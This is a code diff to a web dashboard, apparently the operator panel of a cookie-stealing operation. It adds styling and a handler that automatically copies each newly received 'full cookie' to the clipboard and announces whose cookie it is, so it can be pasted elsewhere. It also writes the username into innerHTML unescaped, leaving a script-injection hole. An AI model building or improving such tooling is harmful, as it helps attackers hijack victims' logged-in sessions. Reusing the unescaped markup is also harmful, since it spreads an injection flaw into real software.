@@ -428,6 +428,82 @@
             100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
         }
 
+        .auto-copy-alert {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #00FF88, #00D4FF);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
+            z-index: 10001;
+            animation: autoCopyAnimation 4s ease-in-out;
+            text-align: center;
+            min-width: 300px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .auto-copy-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .auto-copy-icon {
+            font-size: 2.5rem;
+            animation: bounce 1s infinite;
+        }
+
+        .auto-copy-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .auto-copy-subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        .auto-copy-action {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            margin-top: 5px;
+        }
+
+        @keyframes autoCopyAnimation {
+            0% { 
+                opacity: 0; 
+                transform: translateX(-50%) translateY(-30px) scale(0.8); 
+            }
+            15% { 
+                opacity: 1; 
+                transform: translateX(-50%) translateY(0) scale(1.1); 
+            }
+            85% { 
+                opacity: 1; 
+                transform: translateX(-50%) translateY(0) scale(1); 
+            }
+            100% { 
+                opacity: 0; 
+                transform: translateX(-50%) translateY(-20px) scale(0.9); 
+            }
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
         .loading {
             text-align: center;
             padding: 20px;
@@ -667,6 +743,14 @@
                     break;
                 case 'notification':
                     showNotification(data.message, data.level);
+                    break;
+                case 'autoCopy':
+                    // Auto-copy new cookie to clipboard
+                    if (data.cookieData && data.cookieData.fullCookie) {
+                        copyToClipboard(data.cookieData.fullCookie, 'New Cookie');
+                        showNotification(data.message, 'success');
+                        showAutoCardAnimation(data.cookieData.username);
+                    }
                     break;
             }
         }
@@ -924,6 +1008,26 @@
             setTimeout(() => {
                 document.body.removeChild(successDiv);
             }, 2000);
+        }
+
+        function showAutoCardAnimation(username) {
+            const autoAlert = document.createElement('div');
+            autoAlert.className = 'auto-copy-alert';
+            autoAlert.innerHTML = `
+                <div class="auto-copy-content">
+                    <div class="auto-copy-icon">🍪✨</div>
+                    <div class="auto-copy-title">AUTO-COPIED!</div>
+                    <div class="auto-copy-subtitle">${username}'s cookie copied to clipboard</div>
+                    <div class="auto-copy-action">Ready to paste anywhere! 📋</div>
+                </div>
+            `;
+            document.body.appendChild(autoAlert);
+            
+            setTimeout(() => {
+                if (document.body.contains(autoAlert)) {
+                    document.body.removeChild(autoAlert);
+                }
+            }, 4000);
         }
 
         async function copyAllInfo(cookieId) {
